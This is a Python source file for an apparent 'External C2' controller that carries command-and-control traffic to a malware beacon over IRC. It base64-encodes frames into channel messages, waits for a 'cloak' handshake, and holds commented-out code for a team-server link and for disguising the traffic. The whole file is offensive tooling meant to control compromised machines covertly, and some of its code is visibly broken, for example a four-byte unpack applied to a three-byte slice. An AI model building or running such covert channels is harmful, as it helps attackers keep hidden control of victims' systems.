
import socket
import struct
import time
import base64
import datetime
import sys

class IRCinfo:
    """
    @brief Class to hold info for IRC session
    """
    def __init__(self, ip, port, nick, password, user, real_name, channel, client_nick):
        """

        :param ip: IP address of IRC server
        :param port: Port of IRC server
        :param nick: NICK program will connect as
        :param password: PASS program will use
        :param user: USER program will connect as
        :param real_name: REALNAME program will connect as (optional in IRC)
        :param channel: CHANNEL program will auto-join
        :param client_nick: NICK program will send data to (should be NICK C2 client connected as)
        """
        self.ip = ip
        self.port = port
        self.nick = nick
        self.password = password
        self.user = user
        self.real_name = real_name
        self.channel = channel
        self.client_nick = client_nick


class ExternalC2Controller:
    def __init__(self, port):
        self.port = port

    def encodeFrame(self, data):
        return struct.pack("<I", len(data)) + data

    def decodeFrame(self, data):
        len = struct.unpack("<I", data[0:3])
        body = data[4:]
        return len, body

    '''def sendToTS(self, data):
        self._socketTS.sendall(self.encodeFrame(data))

    def recvFromTS(self):
        data = bytearray()
        _len = self._socketTS.recv(4)
        l = struct.unpack("<I", _len)[0]
        while len(data) < l:
            data += self._socketTS.recv(l - len(data))
        return data

    def sendToBeacon(self, data):
        self._socketClient.sendall(self.encodeFrame(data))

    def recvFromBeacon(self):
        data = bytearray()
        _len = self._socketClient.recv(4)
        l = struct.unpack("<I", _len)[0]
        while len(data) < l:
            data += self._socketClient.recv(l - len(data))
        return data
    '''
    def base64(self, msg):
        return base64.b64encode(msg.encode())

    def debase64(self, b64msg):
        return base64.b64decode(b64msg).decode()

    def send_to_irc(self, text):
        time.sleep(0.05)
        return self._socketBeacon.sendall(text.encode())

    def recv_from_irc(self):
        return self._socketBeacon.recv(1024).decode()

    def equal_check(self, b64msg):
        if b64msg.find("==") != -1:
            return b64msg
        elif b64msg.find("=") != -1:
            b64msg += "="
            return b64msg
        else:
            b64msg += "=="
            return b64msg

    def send_to_beacon(self, data, ircinfo):
        """

        :param data: Cloakified string to send to IRC Server
        :param ircinfo: Class with users IRC info
        """
        #frame = self.encode_frame(data)
        frame = data
        print("Sending Client :{}".format(frame))
        chanmsg = "PRIVMSG {} :Sending msg {}\r\n".format(ircinfo.channel, frame)
        self.send_to_irc(chanmsg)
        b64msg = self.base64(frame).decode()
        b64msg = self.equal_check(b64msg)
        print("B64msg is :{}".format(b64msg))
        chanb64msg = "PRIVMSG {} :Sending encoded msg {}\r\n".format(ircinfo.channel, b64msg)
        self.send_to_irc(chanb64msg)
        """ FOR CLOAKIFY IMPLEMENTATION
        for char in b64msg:
            # print("B64 char: {}".format(char))
            cloakstr = self.cloakify(char)
            # print("cloakstr: {}".format(cloakstr))
            now = datetime.datetime.now()
            irccloakstr = "PRIVMSG {} :T-{:02d}:{:02d}:{:02d}-{}\r\n".format(ircinfo.channel, now.hour, now.minute,
                                                                             now.second, cloakstr)
            self.send_to_irc(irccloakstr)
        """
    
    def recv_from_beacon(self, beacon_data):
        """

        :param beacon_data:
        :return:
        """
        data = ""
        _len = beacon_data[:4]
        datalen = struct.unpack("<I", _len)[0]
        data = beacon_data[4:]
        return data

    def ping_check(self, data):
        """

        :param data: String received from IRC Server
        """
        if data.find("PING :") != -1:
            pingsvr = data[5:]
            pong = "PONG {}".format(pingsvr)
            self.send_to_irc(pong)

    def connect_to_irc(self, ircinfo):
        """

        :param ircinfo: Class with user IRC info
        """
        time.sleep(1)
        password = "PASS {}\r\n".format(ircinfo.password)
        self.send_to_irc(password)
        nick = "NICK {}\r\n".format(ircinfo.nick)
        self.send_to_irc(nick)
        user = "USER {} {} {} :{}\r\n".format(ircinfo.user, "0", "*", ircinfo.real_name)
        self.send_to_irc(user)
        while True:
            data = self.recv_from_irc()
            print("From IRC Server: {}".format(data))

            self.ping_check(data)

            if data.find("MODE ") != -1:
                print("Connection done?")
                break

        userhost = "USERHOST {}\r\n".format(ircinfo.user)
        self.send_to_irc(userhost)
        data = self.recv_from_irc()
        print("From IRC Server: {}".format(data))

    def join_channel(self, ircinfo):
        """

        :param ircinfo: Class with user IRC info
        """
        join = "JOIN {}\r\n".format(ircinfo.channel)
        self.send_to_irc(join)

    def become_oper(self, ircinfo):
        """

        :param ircinfo: Class with user IRC info
        """
        oper = "OPER {} {}\r\n".format(ircinfo.client_nick, ircinfo.password)
        self.send_to_irc(oper)

    def wait_for_client(self):
        """

        :return: True if cloak message is seen, False if Closing Link message is seen
        """
        while True:
            data = self.recv_from_irc()
            if len(data) != 0:
                print("From IRC Server: {}".format(data))

            self.ping_check(data)

            if data.find("PRIVMSG ") != -1:
                cloak = "PRIVMSG {} :cloak".format(ircinfo.channel)
                if data.find(cloak) != -1:
                    return True

            if data.find("ERROR") != -1:
                print("Server sent error.")
                if data.find("Closing Link") != -1:
                    print("Error was to close link!")
                    return False

    def run(self, ircinfo):
        # First thing, wait for a connection from our custom beacon
        self._socketBeacon = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._socketBeacon.connect((ircinfo.ip, ircinfo.port))


        self.connect_to_irc(ircinfo)
        self.join_channel(ircinfo)
        self.become_oper(ircinfo)


        if self.wait_for_client():
            print("Received C2 connection")
        else:
            print("Link Closed.")
            return 1

        data = "payload"

        cloakmsg = "PRIVMSG {} :TrafficServ-".format(ircinfo.channel)
        chanexit = "PRIVMSG {} :exit".format(ircinfo.channel)
        pmexit = "PRIVMSG {} :exit".format(ircinfo.nick)
        quitting = "PRIVMSG {} :quitting\r\n".format(ircinfo.channel)
        quitmsg = "QUIT :\r\n"

        while True:
            print("Sending frame")
            self.send_to_beacon(data,ircinfo)

            print("Recv...")
            b64msg = ""
            flag = 0

            while True:
                data = self.recv_from_irc()
                if len(data) != 0:
                    print("From IRC Server: {}".format(data))

                self.ping_check(data)

                if data.find("PRIVMSG ") != -1:
                    offset = data.find(cloakmsg)
                    if offset != -1:
                        b64msg += data[offset:-2]
                        print("Base64 message : {}".format(b64msg))
                        if b64msg.find("==") != -1:
                            msg = self.debase64(b64msg)
                            print("Message: {}".format(msg))
                            chanmsg = "PRIVMSG {} :Recv msg {}\r\n".format(ircinfo.channel,msg)
                            self.send_to_irc(chanmsg)
                            data = self.recv_from_beacon(msg)
                            break

                    if data.find(chanexit) != -1 or data.find(pmexit) != -1:
                        self.send_to_irc(quitting)
                        self.send_to_irc(quitmsg)
            
            if data.find("ERROR") != -1:
                print("Server sent error.")
                if data.find("Closing Link"):
                    print("Error was to close link!")
                    return 1

if len(sys.argv) != 9:
    print("Number of args passed: {}".format(len(sys.argv)))
    print("Args: {}".format(str(sys.argv)))
    print("Incorrect number of args: \"[IP]\" \"[PORT]\" \"[NICK]\" \"[PASS]\" \"[USER]\" \"[REAL_NAME]\" \"[CHANNEL]\""
          " \"[CLIENT_NICK]\"")
else:
    controller = ExternalC2Controller(3389)
    # ircinfo = IRCinfo("192.168.136.128", 6667, "servbot", "bot", "covertserv", "covertIRCserv", "#bot", "bot")
    ircinfo = IRCinfo(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6], sys.argv[7], 
                      sys.argv[8])
    controller.run(ircinfo)
